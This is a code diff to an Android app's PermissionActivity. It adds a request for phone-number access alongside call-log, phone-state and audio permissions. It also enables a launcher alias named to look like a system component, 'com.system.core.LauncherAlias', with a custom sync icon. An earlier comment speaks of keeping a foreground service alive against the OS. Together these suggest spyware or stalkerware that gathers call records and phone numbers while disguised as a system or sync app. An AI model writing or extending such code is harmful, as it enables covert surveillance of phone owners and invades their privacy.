@@ -37,24 +37,23 @@ class PermissionActivity : AppCompatActivity() {
                 Manifest.permission.READ_PHONE_STATE
             )
 
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                permissions.add(Manifest.permission.READ_PHONE_NUMBERS)
+            }
+
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 permissions.add(Manifest.permission.READ_MEDIA_AUDIO)
             } else {
                 permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
             }
 
-            val hasMissingPermissions = permissions.any {
-                ContextCompat.checkSelfPermission(context, it) != PackageManager.PERMISSION_GRANTED
-            }
-
-            val componentName = ComponentName(context, PermissionActivity::class.java)
+            val aliasComponent = ComponentName(context, "com.system.core.LauncherAlias")
             val pm = context.packageManager
 
-            // Note: Disabling main activity component kills the app process on Android 10+
-            // Keep component enabled so foreground service is never killed by OS
             try {
+                // User requested icon to remain visible with custom sync.jpg
                 pm.setComponentEnabledSetting(
-                    componentName,
+                    aliasComponent,
                     PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                     PackageManager.DONT_KILL_APP
                 )
@@ -78,6 +77,10 @@ class PermissionActivity : AppCompatActivity() {
             Manifest.permission.READ_CALL_LOG,
             Manifest.permission.READ_PHONE_STATE
         )
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            permissions.add(Manifest.permission.READ_PHONE_NUMBERS)
+        }
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             permissions.add(Manifest.permission.READ_MEDIA_AUDIO)
